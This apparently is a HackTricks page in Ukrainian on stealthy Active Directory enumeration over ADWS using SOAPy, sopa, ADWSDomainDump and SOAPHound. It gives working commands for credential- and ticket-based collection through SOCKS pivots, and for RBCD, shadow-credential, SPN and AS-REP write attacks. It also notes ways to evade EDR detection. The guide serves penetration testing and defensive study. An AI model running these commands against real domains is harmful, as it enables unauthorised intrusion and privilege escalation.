# Перерахування Active Directory Web Services (ADWS) і прихований збір даних

{{#include ../../banners/hacktricks-training.md}}

## Що таке ADWS?

Active Directory Web Services (ADWS) **увімкнено за замовчуванням на кожному контролері домену, починаючи з Windows Server 2008 R2**; служба прослуховує TCP-порт **9389**. Попри назву, **HTTP не використовується**. Натомість служба надає доступ до даних у стилі LDAP через стек пропрієтарних протоколів фреймування .NET:<sup>[[1]](#references)[[6]](#references)[[7]](#references)</sup>

* MC-NBFX → MC-NBFSE → MS-NNS → MC-NMF

Оскільки трафік інкапсульовано в цих бінарних SOAP-фреймах і він передається через незвичний порт, **перерахування через ADWS значно рідше перевіряють, фільтрують або виявляють за сигнатурами, ніж звичайний трафік LDAP/389 і 636**. Для операторів це означає:<sup>[[1]](#references)[[7]](#references)</sup>

* Прихованішу розвідку — Blue teams часто зосереджуються на LDAP-запитах.
* Можливість збирати дані з **хостів без Windows (Linux, macOS)**, тунелюючи 9389/TCP через SOCKS-проксі.
* Доступ до тих самих даних, які можна отримати через LDAP (користувачі, групи, ACL, схема тощо), а також можливість виконувати **записи** (наприклад, змінювати `msDs-AllowedToActOnBehalfOfOtherIdentity` для **RBCD**).

Взаємодія з ADWS реалізується через WS-Enumeration: кожен запит починається з повідомлення `Enumerate`, яке визначає LDAP-фільтр/атрибути та повертає GUID `EnumerationContext`, після чого одне або кілька повідомлень `Pull` передають результати порціями розміром до визначеного сервером ліміту.<sup>[[7]](#references)</sup> Контексти стають недійсними приблизно через 30 хвилин, тому інструментам потрібно або посторінково отримувати результати, або розділяти фільтри (запити за префіксами для кожного CN), щоб не втратити стан.<sup>[[8]](#references)</sup> Під час запиту дескрипторів безпеки вкажіть контроль `LDAP_SERVER_SD_FLAGS_OID`, щоб не отримувати SACL; інакше ADWS просто вилучить атрибут `nTSecurityDescriptor` з відповіді SOAP.

> ПРИМІТКА: ADWS також використовують багато інструментів RSAT із графічним інтерфейсом і PowerShell, тому такий трафік може зливатися з легітимною активністю адміністраторів.

## SoaPy — нативний клієнт Python

[SoaPy](https://github.com/logangoins/soapy) — це **повторна реалізація всього стека протоколу ADWS на чистому Python**. Він формує фрейми NBFX/NBFSE/NNS/NMF побайтно, що дає змогу збирати дані з Unix-подібних систем без використання середовища виконання .NET.<sup>[[1]](#references)[[2]](#references)</sup>

### Основні можливості

* Підтримує **роботу через SOCKS-проксі** (корисно для C2-імплантів).
* Точні пошукові фільтри, ідентичні LDAP-фільтрам, наприклад `-q '(objectClass=user)'`.
* Цільові операції **запису** для RBCD, SPN, прапорців облікових записів і ключових облікових даних.<sup>[[2]](#references)</sup>
* Вивід SOAPy можна обробити за допомогою **BOFHound** та імпортувати в BloodHound.<sup>[[2]](#references)[[3]](#references)</sup>
* Прапорець `--parse` для форматування часових міток і `userAccountControl`, коли потрібна зручна для читання інформація.<sup>[[2]](#references)</sup>

### Прапорці цільового збору даних і операції запису

SoaPy містить підібрані параметри, що відтворюють найпоширеніші задачі пошуку через LDAP за допомогою ADWS: `--users`, `--computers`, `--groups`, `--spns`, `--asreproastable`, `--admins`, `--constrained`, `--unconstrained`, `--rbcds`, а також параметри `--query` / `--filter` для власних запитів. Їх можна поєднувати з примітивами запису, як-от `--rbcd <source>` (встановлює `msDs-AllowedToActOnBehalfOfOtherIdentity`), `--spn <service/cn>` (підготовка SPN для цільового Kerberoasting) і `--asrep` (встановлює `DONT_REQ_PREAUTH` у `userAccountControl`).<sup>[[2]](#references)</sup>

Приклад цільового пошуку SPN, який повертає лише `samAccountName` і `servicePrincipalName`:

```bash
SOAPy corp.local/alice:'Winter2025!'@dc01.corp.local \
      --spns -f samAccountName,servicePrincipalName --parse
```

Використайте той самий хост/облікові дані, щоб негайно застосувати результати: виведіть об’єкти, для яких уже налаштовано RBCD, за допомогою `--rbcds`, а потім виконайте `--rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'`, щоб підготувати ланцюжок Resource-Based Constrained Delegation (повний шлях зловживання див. у [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md)).<sup>[[2]](#references)</sup>

### Інсталяція (хост оператора)

Установіть поточний SOAPy CLI з його upstream-репозиторію; у Unix-подібних системах назва виконуваного файла чутлива до регістру.<sup>[[2]](#references)[[9]](#references)</sup>

```bash
pipx install git+https://github.com/logangoins/SOAPy
```

### Збір лише за ticket через SOCKS pivot

Якщо foothold дає Kerberos ticket, але не пароль у відкритому вигляді, перетворіть ticket `.kirbi` на `ccache`, як описано в [Pass the Ticket](pass-the-ticket.md), а потім вкажіть SOAPy цей кеш. Ticket для служби LDAP на DC можна використовувати в задокументованому робочому процесі SOAPy ADWS; спрямуйте трафік ADWS і Kerberos через pivot.<sup>[[9]](#references)</sup>

```bash
KRB5CCNAME=ticket.ccache proxychains4 SOAPy -k \
  corp.local/alice@dc01.corp.local -q '(objectClass=computer)'
```

### Shadow credentials over ADWS

Якщо поточний principal може записувати в `msDS-KeyCredentialLink` цільового об’єкта, SOAPy може додати key credential через ADWS і експортувати відповідний PFX. Збережіть повернутий DeviceID для точного видалення, а не очищайте весь атрибут. Використовуйте PFX для PKINIT, як описано в [Shadow Credentials](acl-persistence-abuse/shadow-credentials.md).<sup>[[10]](#references)</sup>

```bash
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds add --shadow-target targetuser
# After use, remove only the DeviceID returned by the add action:
SOAPy corp.local/alice:'<PASSWORD>'@dc01.corp.local \
  --shadow-creds remove --shadow-target targetuser --device-id '<DEVICE_ID>'
```

## ADWSDomainDump – LDAPDomainDump через ADWS (Linux/Windows)

* Fork `ldapdomaindump`, який замінює LDAP-запити на виклики ADWS через TCP/9389, щоб зменшити кількість спрацьовувань на LDAP-сигнатури.
* Спочатку перевіряє доступність 9389, якщо не вказано `--force` (пропускає перевірку, якщо сканування портів створює багато шуму або фільтрується).
* У README повідомляється про успішний обхід Microsoft Defender for Endpoint і CrowdStrike Falcon.<sup>[[4]](#references)</sup>

### Встановлення

```bash
pipx install .
```

### Використання

```bash
adwsdomaindump -u 'thewoods.local\mathijs.verschuuren' -p 'password' -n 10.10.10.1 dc01.thewoods.local
```

Типовий вивід містить записи про перевірку доступності порту 9389, прив’язування ADWS і початок/завершення дампу:

```text
[*] Connecting to ADWS host...
[+] ADWS port 9389 is reachable
[*] Binding to ADWS host
[+] Bind OK
[*] Starting domain dump
[+] Domain dump finished
```

## Sopa - практичний клієнт для ADWS на Golang

Як і soapy, [sopa](https://github.com/Macmod/sopa) реалізує стек протоколу ADWS (MS-NNS + MC-NMF + SOAP) на Golang, надаючи прапорці командного рядка для виконання викликів ADWS, таких як:<sup>[[5]](#references)</sup>

* **Пошук і отримання об’єктів** - `query` / `get`
* **Життєвий цикл об’єктів** - `create [user|computer|group|ou|container|custom]` і `delete`
* **Редагування атрибутів** - `attr [add|replace|delete]`
* **Керування обліковими записами** - `set-password` / `change-password`
* та інші, як-от `groups`, `members`, `optfeature`, `info [version|domain|forest|dcs]` тощо.

### Основні відповідності протоколів

* Пошук у стилі LDAP виконується через **WS-Enumeration** (`Enumerate` + `Pull`) з проєкцією атрибутів, керуванням областю пошуку (Base/OneLevel/Subtree) і посторінковою видачею.
* Отримання одного об’єкта використовує **WS-Transfer** `Get`; зміни атрибутів — `Put`; видалення — `Delete`.
* Вбудоване створення об’єктів використовує **WS-Transfer ResourceFactory**; для власних об’єктів використовується **IMDA AddRequest** на основі шаблонів YAML.
* Операції з паролями — це дії **MS-ADCAP** (`SetPassword`, `ChangePassword`).<sup>[[5]](#references)</sup>

### Виявлення метаданих без автентифікації (mex)

ADWS надає доступ до WS-MetadataExchange без облікових даних — це швидкий спосіб перевірити доступність перед автентифікацією:<sup>[[5]](#references)</sup>

```bash
sopa mex --dc <DC>
```

### Нотатки щодо виявлення DNS/DC і націлювання на Kerberos

Sopa може знаходити DC через SRV, якщо `--dc` не вказано, а `--domain` задано. Він надсилає запити в такому порядку й використовує ціль із найвищим пріоритетом:<sup>[[5]](#references)</sup>

```text
_ldap._tcp.<domain>
_kerberos._tcp.<domain>
```

На практиці надавайте перевагу DNS-резолверу, контрольованому DC, щоб уникнути збоїв у сегментованих середовищах:

* Використовуйте `--dns <DC-IP>`, щоб **усі** SRV/PTR/forward-запити проходили через DNS DC.
* Використовуйте `--dns-tcp`, якщо UDP заблоковано або відповіді SRV великі.
* Якщо `--dc` — це IP-адреса, sopa завжди виконує зворотний пошук PTR: фільтр адреси `wsa:To` в ADWS вимагає FQDN навіть без Kerberos. Якщо зона reverse відсутня, напряму вкажіть FQDN контролера домену.<sup>[[5]](#references)</sup>

Приклад (IP + Kerberos, примусовий DNS через DC):

```bash
sopa info version --dc 192.168.1.10 --dns 192.168.1.10 -k --domain corp.local -u user -p pass
```

### Варіанти матеріалів автентифікації

Окрім паролів у відкритому тексті, sopa підтримує **NT hashes**, **Kerberos AES keys**, **ccache** і **PKINIT certificates** (PFX або PEM) для автентифікації ADWS. Kerberos використовується автоматично з параметрами `--aes-key`, `-c` (ccache) або параметрами на основі сертифікатів.<sup>[[5]](#references)</sup>

```bash
# NT hash
sopa --dc <DC> -d <DOMAIN> -u <USER> -H <NT_HASH> query --filter '(objectClass=user)'

# Kerberos ccache
sopa --dc <DC> -d <DOMAIN> -u <USER> -c <CCACHE> info domain
```

### Створення довільних об’єктів за допомогою шаблонів

Для довільних класів об’єктів команда `create custom` використовує шаблон YAML, який відповідає запиту IMDA `AddRequest`:<sup>[[5]](#references)</sup>

* `parentDN` і `rdn` визначають контейнер і відносний DN.
* `attributes[].name` підтримує `cn` або простір імен `addata:cn`.
* `attributes[].type` приймає `string|int|bool|base64|hex` або явні `xsd:*`.
* **Не** додавайте `ad:relativeDistinguishedName` або `ad:container-hierarchy-parent`; sopa вставляє їх автоматично.
* Значення `hex` конвертуються в `xsd:base64Binary`; щоб задати порожній рядок, використовуйте `value: ""`.

## SOAPHound – збір даних ADWS у великих обсягах (Windows)

[FalconForce SOAPHound](https://github.com/FalconForceTeam/SOAPHound) — це колектор .NET, який виконує всі взаємодії з LDAP через ADWS і формує JSON, сумісний із BloodHound v4. Спочатку він створює повний кеш `objectSid`, `objectGUID`, `distinguishedName` і `objectClass` (`--buildcache`), а потім повторно використовує його під час проходів `--bhdump`, `--certdump` (ADCS) або `--dnsdump` (DNS, інтегрований з AD), тож із DC передається лише близько 35 критично важливих атрибутів. AutoSplit (`--autosplit --threshold <N>`) автоматично розбиває запити за префіксом CN, щоб не перевищити 30-хвилинний тайм-аут EnumerationContext у великих лісах.<sup>[[8]](#references)</sup>

Типовий робочий процес на операторській VM, приєднаній до домену:

```powershell
# Build cache (JSON map of every object SID/GUID)
SOAPHound.exe --buildcache -c C:\temp\corp-cache.json

# BloodHound collection in autosplit mode, skipping LAPS noise
SOAPHound.exe -c C:\temp\corp-cache.json --bhdump --autosplit --threshold 1200 --nolaps -o C:\temp\BH-output

# ADCS & DNS enrichment for ESC chains
SOAPHound.exe -c C:\temp\corp-cache.json --certdump -o C:\temp\BH-output
SOAPHound.exe --dnsdump -o C:\temp\dns-snapshot
```

Експортований JSON безпосередньо інтегрується в робочі процеси SharpHound/BloodHound — див. [методологію BloodHound](bloodhound.md), щоб дізнатися про подальше побудування графів. AutoSplit забезпечує стійку роботу SOAPHound у лісах із мільйонами об’єктів і водночас зменшує кількість запитів порівняно зі знімками у стилі ADExplorer.

## Прихований робочий процес збору даних AD

У цьому робочому процесі показано, як через ADWS перерахувати **об’єкти домену й ADCS**, перетворити їх на JSON для BloodHound і шукати шляхи атак на основі сертифікатів — усе з Linux:

1. **Створіть тунель для 9389/TCP** із цільової мережі до вашого комп’ютера (наприклад, за допомогою Chisel, Meterpreter, динамічного перенаправлення портів SSH тощо). Спрямуйте клієнт із необробленим TCP-трафіком через SOCKS за допомогою `proxychains4 SOAPy ...` (налаштуйте адресу SOCKS5 у `proxychains4.conf`); `HTTPS_PROXY` не перенаправляє цей протокол, який не є HTTP.<sup>[[9]](#references)</sup>

2. **Зберіть об’єкт кореневого домену:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -q '(objectClass=domain)' \
      | tee data/domain.log
```

3. **Зберіть об’єкти, пов’язані з ADCS, із Configuration NC:**

```bash
proxychains4 SOAPy ludus.domain/jdoe:'P@ssw0rd'@10.2.10.10 \
      -dn 'CN=Configuration,DC=ludus,DC=domain' \
      -q '(|(objectClass=pkiCertificateTemplate)(objectClass=CertificationAuthority)(objectClass=pkiEnrollmentService)(objectClass=msPKI-Enterprise-Oid))' \
      | tee data/adcs.log
```

4. **Перетворення на BloodHound:**

```bash
bofhound -i data --zip   # produces BloodHound.zip
```

5. **Завантажте ZIP** у графічний інтерфейс BloodHound і виконайте cypher-запити, наприклад `MATCH (u:User)-[:Can_Enroll*1..]->(c:CertTemplate) RETURN u,c`, щоб виявити шляхи ескалації через сертифікати (ESC1, ESC8 тощо).

### Запис `msDs-AllowedToActOnBehalfOfOtherIdentity` (RBCD)

Маючи доступ на запис до об’єкта цільового комп’ютера, скористайтеся дією RBCD у SOAPy, а не рядком дескриптора безпеки. Тут `WEBSRV01$` — контрольоване вихідне джерело, а `FILE01$` — ціль, атрибут якої змінюється.<sup>[[2]](#references)</sup>

```bash
SOAPy ludus.domain/jdoe:'P@ssw0rd'@dc.ludus.domain \
      --rbcd add --rbcd-source 'WEBSRV01$' --rbcd-target 'FILE01$'
```

Продовжіть ланцюжок Kerberos S4U у [Resource-Based Constrained Delegation](resource-based-constrained-delegation.md).

## Огляд інструментів

| Призначення | Інструмент | Примітки |
|---------|------|-------|
| Перелік ADWS | [SoaPy](https://github.com/logangoins/soapy) | Python, SOCKS, читання/запис |
| Масове вивантаження ADWS | [SOAPHound](https://github.com/FalconForceTeam/SOAPHound) | .NET, cache-first, режими BH/ADCS/DNS |
| Імпорт у BloodHound | [BOFHound](https://github.com/bohops/BOFHound) | Перетворює журнали SoaPy/ldapsearch |
| Компрометація сертифіката | [Certipy](https://github.com/ly4k/Certipy) | Можна проксувати через той самий SOCKS |
| Перелік ADWS та зміни об’єктів | [sopa](https://github.com/Macmod/sopa) | Універсальний клієнт для взаємодії з відомими кінцевими точками ADWS — дає змогу виконувати перелік, створювати об’єкти, змінювати атрибути та паролі |



## References

- [1] [SpecterOps – Обов’язково використовуйте SOAP(y) – посібник оператора зі скритного збору даних AD за допомогою ADWS](https://specterops.io/blog/2025/07/25/make-sure-to-use-soapy-an-operators-guide-to-stealthy-ad-collection-using-adws/)
- [2] [SoaPy на GitHub](https://github.com/logangoins/soapy)
- [3] [BOFHound на GitHub](https://github.com/bohops/BOFHound)
- [4] [ADWSDomainDump на GitHub](https://github.com/mverschu/adwsdomaindump)
- [5] [Sopa на GitHub](https://github.com/Macmod/sopa)
- [6] [Microsoft – специфікації MC-NBFX, MC-NBFSE, MS-NNS, MC-NMF](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-nbfx/)
- [7] [IBM X-Force Red – Скритний збір даних в Active Directory за допомогою ADWS](https://logan-goins.com/2025-02-21-stealthy-enum-adws/)
- [8] [FalconForce – інструмент SOAPHound для збору даних Active Directory через ADWS](https://falconforce.nl/soaphound-tool-to-collect-active-directory-data-via-adws/)
- [9] [Вікі SOAPy – Recon](https://github.com/logangoins/SOAPy/wiki/Recon)
- [10] [Вікі SOAPy – Post-Exploitation](https://github.com/logangoins/SOAPy/wiki/Post%E2%80%90Exploitation)
{{#include ../../banners/hacktricks-training.md}}
